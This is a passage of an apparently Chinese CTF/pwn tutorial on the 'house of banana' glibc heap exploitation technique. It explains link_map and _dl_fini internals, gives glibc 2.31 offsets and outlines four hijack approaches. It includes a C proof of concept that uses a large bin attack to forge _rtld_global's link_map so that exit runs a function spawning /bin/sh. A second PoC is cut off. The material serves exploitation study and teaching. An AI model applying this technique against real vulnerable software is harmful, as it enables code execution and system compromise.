class="type">char</span> *name;</span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="type">size_t</span> size;</span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="built_in">void</span> (*free) (<span class="type">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">r_debug</span> _ns_debug;</span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中有多个<code>_dl_ns</code>结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体</p><p>类似于IDA中的段结构体</p><p>继续之后的学习还会遇见以下几个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">lt_executable,<span class="comment">/* The main executable program.  */</span></span><br><span class="line">lt_library,<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">lt_loaded<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    ............以下还有不少,在这里不是很重要</span><br><span class="line">   <span class="comment">//在 C 语言中，变量声明后加:1 表示该变量是一个位域（bit-field）。位域允许将一个整数类型的数据分割为多个较小的位字段，以便更有效地使用内存。&quot;:1&quot; 表示该位域的宽度为 1 位。这意味着该变量只能存储一个位的值，即 0 或 1。</span></span><br><span class="line">        <span class="comment">//l_init_called变量在这里是第四个位域</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ptype Elf64_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf64_Xword d_val;<span class="comment">//union结构体只取其一</span></span><br><span class="line">        Elf64_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这些个结构体在退出时会被dl_fini调用[glibc/elf/dl_fini.c]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">      <span class="comment">//大多数时候dl_nns都是1,也就是这个循环只执行一次,ns==0</span></span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          <span class="comment">//nloaded通常为4</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">          <span class="comment">//因为ns==0,所以必须i==4,也就是上面的循环要执行四次</span></span><br><span class="line">  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_init_called)<span class="comment">//l-&gt;l_init_called字段需要大于0</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">  ns);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));<span class="comment">//sizeof==8</span></span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)<span class="comment">//i最少要为1</span></span><br><span class="line">    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();<span class="comment">//!!注意此时的i已经--了</span></span><br><span class="line">&#125;</span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">    <span class="comment">//后半部分在2.37以后由一个函数实现,不过实现逻辑并未改变,不影响该利用方法</span></span><br><span class="line">    <span class="type">void</span></span><br><span class="line">_dl_call_fini (<span class="type">void</span> *closure_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> =</span> closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, <span class="built_in">map</span>-&gt;l_name, <span class="built_in">map</span>-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  <span class="built_in">map</span>-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  ElfW(Dyn) *fini_array = <span class="built_in">map</span>-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (<span class="built_in">map</span>-&gt;l_addr</span><br><span class="line">                                          + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="type">size_t</span> sz = (<span class="built_in">map</span>-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                   / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[sz]) ();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>函数只截取到最终利用的地方<code>((fini_t) array[i]) ();</code></p><p>因此，可以利用large bin attack劫持rtld_global的_ns_loaded指针(指向link_map,和动态链接中使用的link_map是同一个),使其指向一片可控的区域(例如堆)，</p><p>并事先在可控区域里伪造好link_map结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。</p><p>此外最终执行的<code>array[i]) ()</code>其在一个while循环中，所以只要把i构造恰当，那么就可完成些不太严谨的ROP。</p><p>偏移表(2.31)不同libc版本会有差异</p><div class="table-container"><table><thead><tr><th>偏移</th><th>字段</th></tr></thead><tbody><tr><td>+0</td><td>l_addr</td></tr><tr><td>+0x18</td><td>l_next</td></tr><tr><td>+0x28</td><td>l_real</td></tr><tr><td>+0x110</td><td>l_info[DT_FINI_ARRAY]</td></tr><tr><td>+0x120</td><td>l_info[DT_FINI_ARRAYSZ]</td></tr><tr><td>+0x31c位域倒数第四位</td><td>l_init_called</td></tr></tbody></table></div><p>有四个思路</p><ul><li>思路1:直接劫持(_rtld_global._dl_ns[0]._ns_loaded)，布局好其他内容，使其调用到 fini_array</li><li>思路2:伪造(_rtld_global._dl_ns[0]._ns_loaded) 的 第三个next 指针，布局好其他内容，使其调用到 fini_array</li><li>思路3:直接劫持(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26&amp;&amp;28],l_info[26]控制d_ptr,l_info[28]的d_val字段得大于8(实际上是不可控的size字段,必然满足条件),且d_ptr受到d_val和l_addr影响</li><li>思路4:修改 link_map-&gt;l_addr，根据偏移使其调用到指定区域的函数,可行性不大,因为largebin_attack只能够使l_addr修改为堆地址,<strong>除非在某些特殊情况能够做到任意写l_addr</strong></li></ul><h2 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h2><p>需要根据环境需要修改偏移，在有些情况下，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</p><h3 id="思路1-poc"><a href="#思路1-poc" class="headerlink" title="思路1-poc:"></a>思路1-poc:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">   <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">   <span class="type">size_t</span> libc_base = &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">   <span class="type">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">0x23a060</span>;</span><br><span class="line">   <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">free</span>(ptr0);</span><br><span class="line">   <span class="comment">//put ptr9 into large bin</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">   <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line">   <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//fake a _rtld_global</span></span><br><span class="line">   <span class="type">size_t</span> fake_rtld_global_addr = ptr1 - <span class="number">0x10</span>;</span><br><span class="line">   <span class="type">size_t</span> *fake_rtld_global = (<span class="type">size_t</span> *)ptr1;</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">   <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">   fake_rtld_global[<span class="number">1</span>] = &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_next</span></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;<span class="comment">//l_real</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">8</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0</span>;                    <span class="comment">//这一块都是在伪造next的接下来三次遍历</span></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//为什么不指向自己绕过,因为退出的条件时l==NULL</span></span><br><span class="line"><span class="comment">//如果指向自己那就永远无法退出了</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">   <span class="comment">//fake a fini_array segment</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x20</span>] = &amp;fake_rtld_global[<span class="number">0x30</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x22</span>] = &amp;fake_rtld_global[<span class="number">0x23</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x23</span>+<span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//func ptrs total len</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x30</span>] = <span class="number">0x1A</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">-2</span>] = &amp;fake_rtld_global[<span class="number">0x32</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//funcs</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x32</span>] = backdoor;</span><br><span class="line"><span class="comment">//布置l_info[26]和l_info[28]指向的Elf64_Dyn结构体</span></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x61</span>] = <span class="number">0x800000000</span>;<span class="comment">//l_init_call,为什么这样设置参考上面的位域声明</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路2-poc"><a href="#思路2-poc" class="headerlink" title="思路2-poc:"></a>思路2-poc:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">getLibcBase</span><span 